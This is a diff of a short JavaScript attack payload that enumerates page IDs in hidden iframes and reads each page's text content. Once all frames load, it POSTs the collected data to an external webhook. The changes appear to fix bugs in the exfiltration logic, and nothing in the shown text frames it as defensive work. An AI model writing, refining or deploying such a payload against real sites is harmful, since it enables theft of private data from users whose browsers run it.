@@ -8,30 +8,30 @@ function run(a = 2800, b = 2840) {
     const total = b - a;
 
     for (let i = a; i < b; i++) {
-        
-        
         const iframe = document.createElement("iframe");
         iframe.src = TARGET + i;
 
         iframe.onload = () => {
-            if (!iframe.contentDocument){
-                loadedCount++;
-                return;
+            if (iframe.contentDocument) {
+                results.push({
+                    id: i,
+                    data: iframe.contentDocument.documentElement.textContent
+                });
             }
-            results.push({
-                id: i,
-                data: iframe.contentDocument.documentElement.textContent
-            });
 
             loadedCount++;
 
-            if (loadedCount !== b - a){
+            if (loadedCount === total) {
                 fetch(WEBHOOK, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(results)
                 });
-            };
+
+                console.log("sent");
+            }
+        };
+
         document.documentElement.appendChild(iframe);
     }
 }
